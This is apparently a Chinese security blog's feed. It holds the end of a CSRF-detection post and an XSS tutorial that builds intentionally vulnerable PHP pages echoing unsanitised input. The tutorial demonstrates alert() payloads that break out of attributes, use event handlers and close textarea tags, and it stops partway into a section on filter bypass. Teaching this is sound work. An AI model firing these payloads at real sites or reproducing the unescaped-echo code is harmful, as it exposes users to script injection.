&lt;h4 id=&quot;作者信息：&quot;&gt;&lt;a href=&quot;#作者信息：&quot; class=&quot;headerlink&quot; title=&quot;作者信息：&quot;&gt;&lt;/a&gt;&lt;code&gt;作者信息：&lt;/code&gt;&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;Author:Black-Hole&lt;/p&gt;
&lt;p&gt;Blog:&lt;a href=&quot;http://bugs.cc/&quot;&gt;http://bugs.cc/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;github:&lt;a href=&quot;https://github.com/BlackHole1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/BlackHole1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Twitter:&lt;a href=&quot;https://twitter.com/Free_BlackHole&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://twitter.com/Free_BlackHole&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Email:158blackhole@gmail.com&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-前言：&quot;&gt;&lt;a href=&quot;#0x00-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言：&quot;&gt;&lt;/a&gt;0x00 前言：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;之前写过自动化检测XSS插件，今天来一发自动化检测CSRF的插件。CSRF有多种情况的出现方式，而本章所说的内容没有办法做的那么全面，就比如JSON Hijacking（第二章或者第三章会写），本章我们就说说form表单导致的CSRF漏洞。&lt;br&gt;检测form表单类型的CSRF漏洞和检测form表单类型的XSS漏洞最大的不同就是：XSS需要提交才能检测到，而CSRF只需要分析form表单就行了。&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bugs.cc/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>XSS的原理分析与解剖</title>
    <link href="http://bugs.cc/2016/05/30/XSS%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E5%89%96/"/>
    <id>http://bugs.cc/2016/05/30/XSS的原理分析与解剖/</id>
    <published>2016-05-30T03:27:07.000Z</published>
    <updated>2016-08-23T16:02:38.365Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;h3 id=&quot;0×01-前言&quot;&gt;&lt;a href=&quot;#0×01-前言&quot; class=&quot;headerlink&quot; title=&quot;0×01 前言:&quot;&gt;&lt;/a&gt;0×01 前言:&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;《xss攻击手法》一开始在互联网上资料并不多(都是现成的代码，没有从基础的开始)，直到刺的《白帽子讲WEB安全》和cn4rry的《XSS跨站脚本攻击剖析与防御》才开始好转。&lt;/p&gt;
&lt;p&gt;我这里就不说什么xss的历史什么东西了，xss是一门又热门又不太受重视的Web攻击手法，为什么会这样呢，原因有下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;耗时间&lt;/li&gt;
&lt;li&gt;有一定几率不成功&lt;/li&gt;
&lt;li&gt;没有相应的软件来完成自动化攻击&lt;/li&gt;
&lt;li&gt;前期需要基本的html、js功底，后期需要扎实的html、js、actionscript2/3.0等语言的功底&lt;/li&gt;
&lt;li&gt;是一种被动的攻击手法&lt;/li&gt;
&lt;li&gt;对website有http-only、crossdomian.xml没有用&lt;/li&gt;
&lt;/ol&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;但是这些并没有影响黑客对此漏洞的偏爱，原因不需要多，只需要一个“XSS几乎每个网站都存在，google、baidu、360等都存在。”&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0x02-原理：&quot;&gt;&lt;a href=&quot;#0x02-原理：&quot; class=&quot;headerlink&quot; title=&quot;0x02 原理：&quot;&gt;&lt;/a&gt;0x02 原理：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;首先我们现在本地搭建个PHP环境(可以使用phpstudy安装包安装)，然后在index.php文件里写入如下代码:&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;http-equiv&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;content&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/html; charset=utf-8&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;XSS原理重现&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;action&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;method&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;get&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;xss_input&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;submit&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;hr&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $xss = $_GET[&#39;xss_input&#39;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        echo &#39;你输入的字符为&amp;lt;br&amp;gt;&#39;.$xss;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后，你会在页面看到这样的页面&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/iK1iNW.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们试着输入abcd123，得到的结果为&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/HheYf8.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们在看看源代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/aSWspi.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们输入的字符串被原封不动的输出来了，那这里我们提出来一个假设，假设我们在搜索框输入&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;会出现什么呢？如果按照上面的例子来说，它应该存在第12行的&lt;code&gt;&amp;lt;br&amp;gt;&lt;/code&gt;与&lt;code&gt;&amp;lt;/boby&amp;gt;&lt;/code&gt;之间，变成&lt;code&gt;&amp;lt;br&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;&amp;lt;/boby&amp;gt;&lt;/code&gt;，那应该会弹出对话框。&lt;/p&gt;
&lt;p&gt;既然假设提出来，那我们来实现下这个假设成不成立吧。&lt;/p&gt;
&lt;p&gt;我们输入&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;，得到的页面为&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/cdFv9V.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;成功弹窗，这个时候基本上就可以确定存在xss漏洞。&lt;/p&gt;
&lt;p&gt;我们在看看源代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/ImuxHT.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;看来，我们的假设成功了，这节就说说XSS的原理，下面几节说说xss的构造和利用&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0×03-xss利用输出的环境来构造代码&quot;&gt;&lt;a href=&quot;#0×03-xss利用输出的环境来构造代码&quot; class=&quot;headerlink&quot; title=&quot;0×03 xss利用输出的环境来构造代码:&quot;&gt;&lt;/a&gt;0×03 xss利用输出的环境来构造代码:&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;上节说了xss的原理，但是我们的输出点不一在&lt;code&gt;&amp;lt;br&amp;gt;&lt;/code&gt;和&lt;code&gt;&amp;lt;/boby&amp;gt;&lt;/code&gt;里，可以出现在html标签的属性里，或者其他标签里面。所以这节很重要，因为不一定 当你输入&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;就会弹窗。&lt;/p&gt;
&lt;p&gt;先贴出代码:&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;http-equiv&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;content&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/html; charset=utf-8&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;XSS利用输出的环境来构造代码&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;h6&lt;/span&gt;&amp;gt;&lt;/span&gt;把我们输入的字符串 输出到input里的value属性里&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;h6&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;action&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;method&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;get&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;h6&lt;/span&gt;&amp;gt;&lt;/span&gt;请输入你想显现的字符串&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;h6&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;xss_input_value&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;输入&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;submit&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;hr&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $xss = $_GET[&#39;xss_input_value&#39;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            if(isset($xss))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                echo &#39;&amp;lt;input type=&quot;text&quot; value=&quot;&#39;.$xss.&#39;&quot;&amp;gt;&#39;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                echo &#39;&amp;lt;input type=&quot;type&quot; value=&quot;输出&quot;&amp;gt;&#39;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            ?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;下面是代码的页面&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/EeVT32.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这段代码的作用是把第一个输入框的字符串，输出到第二个输入框，我们输入1，那么第二个input里的value值就是1，下面是页面的截图和源代码的截图(这里我输入&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;来测试)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/1h5YdR.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/vwP031.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;明显的可以看到，并没有弹出对话框，大家可能会疑惑为什么没有弹窗呢，我们来看看源代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/QJtpQo.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们看到我们输入的字符串被输出到第15行input标签里的value属性里面，被当成value里的值来显现出来，所以并没有弹窗，这时候我们该怎么办呢？聪明的人已经发现了可以在&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;前面加个&lt;code&gt;&amp;quot;&amp;gt;&lt;/code&gt;来闭合input标签。所以应该得到的结果为&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/UHREw4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;成功弹窗了，我们在看看这时的页面&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/flfTcb.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;看到后面有第二个input输入框后面跟有”&amp;gt;字符串，为什么会这样呢，我们来看看源代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/uvuo5i.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这时可以看到我们构造的代码里面有两个&lt;code&gt;&amp;quot;&amp;gt;&lt;/code&gt;，第一个”&amp;gt;是为了闭合input标签，所以第二个&lt;code&gt;&amp;quot;&amp;gt;&lt;/code&gt;就被抛弃了，因为html的容错性高，所以并没有像php那样出现错误，而是直接把多余的字符串来输出了，有的人是个完美主义者，不喜欢有多余的字符串被输出，这时该怎么办呢？&lt;/p&gt;
&lt;p&gt;这里我问大家一个问题，我之前说的xss代码里，为什么全是带有标签的。难道就不能不带标签么？！答：当然可以。既然可以不用标签，那我们就用标签里的属性来构造XSS，这样的话，xss代码又少，又不会有多余的字符串被输出来。&lt;/p&gt;
&lt;p&gt;还是这个环境，但是不能使用标签，你应该怎么做。想想input里有什么属性可以调用js，html学的好的人，应该知道了，on事件，对的。我们可以用on事件来进行弹窗，比如这个xss代码 我们可以写成&lt;code&gt;&amp;quot; onclick=&amp;quot;alert(&amp;#39;xss&amp;#39;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这时，我们在来试试，页面会发生什么样的变化吧。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/tgdkGA.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;没有看到弹窗啊，失败了么？答案当然是错误的，因为onclick是鼠标点击事件，也就是说当你的鼠标点击第二个input输入框的时候，就会触发onclick事件，然后执行&lt;code&gt;alert(&amp;#39;xss&amp;#39;)&lt;/code&gt;代码。我们来试试看&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/gcQF2g.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;当我点击后，就出现了弹窗，这时我们来看看源代码把&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/wq0ht7.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;第15行，value值为空，当鼠标点击时，就会弹出对话框。这里可能就会有人问了，如果要点击才会触发，那不是很麻烦么，成功率不就又下降了么。我来帮你解答这个问题，on事件不止onclick这一个，还有很多，如果你想不需要用户完成什么动作就可以触发的话，i可以把onclick改成&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;onmousemove 当鼠标移动就触发&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;onload 当页面加载完成后触发&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;还有很多，我这里就不一一说明了，有兴趣的朋友可以自行查询下。&lt;/p&gt;
&lt;p&gt;别以为就这样结束了，还有一类环境不能用上述的方法，&lt;/p&gt;
&lt;p&gt;那就是如果在&lt;code&gt;&amp;lt;textarea&amp;gt;&lt;/code&gt;标签里呢？！或者其他优先级比script高的呢？&lt;/p&gt;
&lt;p&gt;就下面这样&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/xYdH4Z.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这时我们该怎么办呢？既然前面都说了闭合属性和闭合标签了，那能不能闭合完整的标签呢，答案是肯定的。我们可以输入&lt;code&gt;&amp;lt;/textarea&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;就可以实现弹窗了。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0×04-过滤的解决办法&quot;&gt;&lt;a href=&quot;#0×04-过滤的解决办法&quot; class=&quot;headerlink&quot; title=&quot;0×04 过滤的解决办法:&quot;&gt;&lt;/a&gt;0×04 过滤的解决办法:&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;假如说网站禁止过滤了script 这时该怎么办呢，记住一句话，这是我总结出来的“xss就是在页面执行你想要的js”不用管那么多，只要能运行我们的js就OK，比如用img标签或者a标签。我们可以这样写&lt;/p&gt;
